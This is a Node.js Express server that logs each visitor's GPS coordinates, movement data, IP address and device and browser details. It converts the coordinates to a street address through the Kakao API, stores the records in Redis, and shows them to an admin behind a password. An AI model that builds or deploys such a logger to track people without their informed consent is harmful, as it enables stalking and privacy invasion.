const express = require('express');
const cors = require('cors');
const { createClient } = require('redis');
const axios = require('axios');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// Redis 설정
const redisClient = createClient({
    url: process.env.REDIS_URL
});
redisClient.on('error', (err) => console.log('Redis Client Error', err));
redisClient.connect().then(() => console.log('Redis 연결 성공!'));

// 카카오 주소 변환 함수
async function getAddressFromCoords(lat, lng) {
    try {
        const KAKAO_KEY = process.env.KAKAO_API_KEY; 
        if (!KAKAO_KEY) {
            console.warn("카카오 API 키가 설정되지 않았습니다.");
            return `위도 ${Number(lat).toFixed(4)}, 경도 ${Number(lng).toFixed(4)}`;
        }

        const response = await axios.get('https://dapi.kakao.com/v2/local/geo/coord2address.json', {
            params: { x: lng, y: lat },
            headers: { Authorization: `KakaoAK ${KAKAO_KEY}` }
        });

        if (response.data && response.data.documents && response.data.documents.length > 0) {
            const doc = response.data.documents[0];
            return doc.road_address ? doc.road_address.address_name : doc.address.address_name;
        }
        return "알 수 없는 위치 (좌표는 존재)";
    } catch (error) {
        console.error("카카오 주소 변환 에러:", error.message);
        return `위도 ${Number(lat).toFixed(4)}, 경도 ${Number(lng).toFixed(4)}`;
    }
}

// 클라이언트 데이터 수집 라우터
app.post('/submit-location', async (req, res) => {
    const { 
        latitude, longitude, speed, heading, altitude, 
        userAgent, language, platform, referrer, currentUrl, 
        screenResolution, windowSize, networkType 
    } = req.body;
    
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    let addressText = "확인 불가 (위치 권한 거부)";
    
    if (latitude && longitude) {
        addressText = await getAddressFromCoords(latitude, longitude);
    }

    const newLog = {
        time: new Date().toLocaleString("ko-KR", { timeZone: "Asia/Seoul" }),
        ip: clientIp,
        latitude,
        longitude,
        speed,
        heading,
        altitude,
        address: addressText,
        userAgent: userAgent || req.headers['user-agent'],
        language,
        platform,
        referrer,
        currentUrl,
        screenResolution,
        windowSize,
        networkType
    };

    try {
        const existingData = await redisClient.get('visitor_logs');
        const logs = existingData ? JSON.parse(existingData) : [];
        logs.push(newLog);
        await redisClient.set('visitor_logs', JSON.stringify(logs));
        res.json({ success: true });
    } catch (err) {
        console.error("데이터 저장 실패:", err);
        res.status(500).json({ success: false });
    }
});

app.post('/admin-data', async (req, res) => {
    const { password } = req.body;

    if (password !== process.env.ADMIN_PW) {
        return res.status(401).json({ message: "비밀번호가 틀렸습니다." });
    }

    try {
        const existingData = await redisClient.get('visitor_logs');
        const logs = existingData ? JSON.parse(existingData) : [];
        res.json(logs);
    } catch (err) {
        console.error("데이터 읽기 실패:", err);
        res.status(500).json({ message: "데이터 읽기 실패" });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`서버가 포트 ${PORT}에서 작동 중입니다.`);
});
